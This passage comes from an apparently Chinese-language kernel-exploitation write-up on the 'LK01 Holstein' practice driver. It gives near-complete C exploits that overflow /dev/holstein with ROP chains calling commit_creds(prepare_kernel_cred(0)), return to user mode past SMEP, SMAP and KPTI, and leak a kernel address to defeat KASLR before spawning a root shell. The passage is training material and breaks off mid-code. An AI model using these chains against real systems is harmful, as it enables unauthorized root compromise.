punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[+] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">getRootPrivilige</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>prepare_kernel_cred_addr<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>commit_creds_addr<span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Open Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x80</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>ropchain<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>prepare_kernel_cred_addr<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RCX_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_RDI_RAX_REP_MOVSQ_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds_addr<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>SWAPGS_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>IRETQ_POP_RBP_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>getRootShell<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> ropchain<span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="三、LK01-Holstein-v1-smep-smap-kpti"><a href="#三、LK01-Holstein-v1-smep-smap-kpti" class="headerlink" title="三、LK01 Holstein v1 +smep, +smap,  kpti"></a>三、LK01 Holstein v1 +smep, +smap,  kpti</h1><p>用<code>swapgs_restore_regs_and_return_to_usermode()</code>来降落用户态</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//gcc exp.c -o exp -static -masm=intel</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SWAPGS_RET</span> <span class="token expression"><span class="token number">0xffffffff8160bf7e</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IRETQ_POP_RBP_RET</span> <span class="token expression"><span class="token number">0xffffffff810202af</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff8127bbdc</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_REP_MOVSQ_RET</span> <span class="token expression"><span class="token number">0xffffffff8160c96b</span><span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RCX_RET</span> <span class="token expression"><span class="token number">0xffffffff812ea083</span><span class="token punctuation">;</span></span></span><span class="token class-name">size_t</span> prepare_kernel_cred_addr<span class="token operator">=</span><span class="token number">0xffffffff8106e240</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds_addr<span class="token operator">=</span><span class="token number">0xffffffff8106e390</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81800e10</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> kernel_base<span class="token operator">=</span><span class="token number">0xffffffffc0000000</span><span class="token punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[+] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">getRootPrivilige</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>prepare_kernel_cred_addr<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>commit_creds_addr<span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token operator">*</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"Open Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x80</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>ropchain<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>prepare_kernel_cred_addr<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RCX_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_RDI_RAX_REP_MOVSQ_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds_addr<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span><span class="token number">22</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>getRootShell<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> ropchain<span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="四、LK01-Holstein-v1-smep-smap-kpti-kaslr"><a href="#四、LK01-Holstein-v1-smep-smap-kpti-kaslr" class="headerlink" title="四、LK01 Holstein v1 +smep, +smap,  kpti,  kaslr"></a>四、LK01 Holstein v1 +smep, +smap,  kpti,  kaslr</h1><p>可以利用module_read的越界读得到真实地址，以此实现“去kaslr”</p><p>在0x408处刚好能读到返回地址：0xffffffff8113d33c (vfs_read+172)，泄露了内核基地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//gcc exp.c -o exp -static -masm=intel</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SWAPGS_RET</span> <span class="token expression"><span class="token number">0xffffffff8160bf7e</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IRETQ_POP_RBP_RET</span> <span class="token expression"><span class="token number">0xffffffff810202af</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff8127bbdc</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_REP_MOVSQ_RET</span> <span class="token expression"><span class="token number">0xffffffff8160c96b</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RCX_RET</span> <span class="token expression"><span class="token number">0xffffffff812ea083</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token class-name">size_t</span> prepare_kernel_cred_addr<span class="token operator">=</span><span class="token number">0xffffffff8106e240</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds_addr<span class="token operator">=</span><span class="token number">0xffffffff8106e390</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81800e10</span><span class="token punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[+] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">getRootPrivilige</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>prepare_kernel_cred_addr<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span 